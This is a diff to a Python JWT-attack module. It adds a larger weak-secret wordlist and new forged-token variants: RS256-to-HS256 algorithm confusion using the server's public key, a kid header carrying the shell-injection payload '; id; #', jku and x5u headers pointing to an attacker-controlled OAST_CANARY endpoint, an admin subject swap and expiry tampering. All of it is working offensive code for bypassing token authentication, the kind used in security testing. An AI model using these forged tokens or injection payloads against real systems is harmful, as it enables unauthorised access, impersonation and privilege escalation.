@@ -21,7 +21,14 @@ COMMON_JWT_SECRETS = [
     "secret", "password", "123456", "admin", "jwt", "key", "secretkey",
     "jwtsecret", "root", "test", "development", "private", "12345678",
     "auth", "token", "supersecret", "changeme", "default", "master",
-    "1234", "qwerty", "app", "api", "guest", "welcome", "mysecret"
+    "1234", "qwerty", "app", "api", "guest", "welcome", "mysecret",
+    "jwt_secret", "jwt-secret", "your-256-bit-secret", "your_secret_key",
+    "mysecretkey", "this-is-a-secret", "shhhhh", "s3cr3t", "secret123",
+    "django-insecure-change-me", "SECRET_KEY", "flask-secret-key",
+    "express-session-secret", "node-secret", "laravel_session",
+    "symfony-secret", "spring-secret", "rails-secret-key-base",
+    "my-super-secret-key-that-i-will-never-guess", "keyboardcat",
+    "letmein", "iloveyou", "monkey", "dragon", "trustno1", "abc123"
 ]
 
 
@@ -133,14 +140,23 @@ def forge_jwt(
 def generate_jwt_attack_variants(
     token: str,
     claims_override: Optional[Dict[str, Any]] = None,
-    known_secret: Optional[str] = None
+    known_secret: Optional[str] = None,
+    public_key_pem: Optional[str] = None
 ) -> List[Dict[str, Any]]:
     """
     Generates a suite of offensive JWT mutations targeting:
     - Algorithm None bypasses (lowercase, uppercase, mixed)
-    - Claim tampering (role escalation, user ID tampering)
+    - Algorithm confusion (RS256 -> HS256 using the server's own public key as HMAC secret)
+    - Claim tampering (role escalation, user ID tampering, subject swap)
     - Empty secret signing
-    - Key ID (kid) parameter manipulation
+    - Key ID (kid) parameter manipulation (SQLi, path traversal, command injection)
+    - jku / x5u remote key-fetch header injection
+    - Expiry / nbf temporal validation bypass
+
+    `public_key_pem` is optional; when supplied, it is used verbatim (as raw
+    bytes of the PEM text) as the HMAC secret for the alg-confusion variant.
+    This mirrors the classic RS256->HS256 confusion attack and requires no
+    asymmetric crypto library - only stdlib `hmac`/`hashlib` via `forge_jwt`.
     """
     parsed = parse_jwt(token)
     header = parsed["header"]
@@ -220,6 +236,61 @@ def generate_jwt_attack_variants(
         "vector": "jku_header_injection",
         "description": "Header jku URL pointing to local proxy/attacker JWKS endpoint",
         "token": forge_jwt(jku_header, escalated_payload, secret="attacker_key", alg_override="HS256")
+    })
+
+    # 3e. Key ID (kid) Command Injection
+    kid_cmd_header = dict(header)
+    kid_cmd_header["kid"] = "; id; #"
+    variants.append({
+        "vector": "kid_command_injection",
+        "description": "Header kid parameter shell command-injection payload",
+        "token": forge_jwt(kid_cmd_header, escalated_payload, secret="1", alg_override="HS256")
+    })
+
+    # 3f. JKU out-of-band canary (attacker-controlled remote key fetch)
+    jku_canary_header = dict(header)
+    jku_canary_header["jku"] = "https://OAST_CANARY/jwks.json"
+    variants.append({
+        "vector": "jku_canary_injection",
+        "description": "Header jku URL pointing to an out-of-band attacker-controlled JWKS endpoint",
+        "token": forge_jwt(jku_canary_header, escalated_payload, secret="attacker_key", alg_override="HS256")
+    })
+
+    # 3g. X5U out-of-band canary (attacker-controlled remote X.509 cert fetch)
+    x5u_canary_header = dict(header)
+    x5u_canary_header["x5u"] = "https://OAST_CANARY/jwks.json"
+    variants.append({
+        "vector": "x5u_canary_injection",
+        "description": "Header x5u URL pointing to an out-of-band attacker-controlled certificate endpoint",
+        "token": forge_jwt(x5u_canary_header, escalated_payload, secret="attacker_key", alg_override="HS256")
+    })
+
+    # 3h. Algorithm Confusion: RS256 -> HS256 (server's RSA public key reused as HMAC secret)
+    if public_key_pem:
+        variants.append({
+            "vector": "alg_confusion_rs256_to_hs256",
+            "description": "Header alg downgraded from RS256 to HS256, signed using the server's own public key PEM as the HMAC secret",
+            "token": forge_jwt(header, escalated_payload, secret=public_key_pem, alg_override="HS256")
+        })
+
+    # 3i. Claim Tampering: explicit subject swap (impersonation)
+    sub_swap_payload = dict(escalated_payload)
+    sub_swap_payload["sub"] = "admin"
+    variants.append({
+        "vector": "claim_sub_swap_admin",
+        "description": "Subject claim ('sub') swapped to 'admin' to probe for impersonation",
+        "token": forge_jwt(header, sub_swap_payload, secret="1", alg_override="HS256")
+    })
+
+    # 3j. Temporal Tampering: extend/remove exp, backdate nbf
+    temporal_payload = dict(escalated_payload)
+    temporal_payload.pop("exp", None)
+    temporal_payload["exp"] = 9999999999  # far-future expiry (year 2286)
+    temporal_payload["nbf"] = 0  # backdated "not before" (epoch start)
+    variants.append({
+        "vector": "temporal_exp_nbf_tampering",
+        "description": "Expiry extended to a far-future timestamp and 'nbf' backdated to epoch 0 to probe for missing temporal validation",
+        "token": forge_jwt(header, temporal_payload, secret="1", alg_override="HS256")
     })
 
     # 4. If weak secret was cracked, include fully forged valid signature
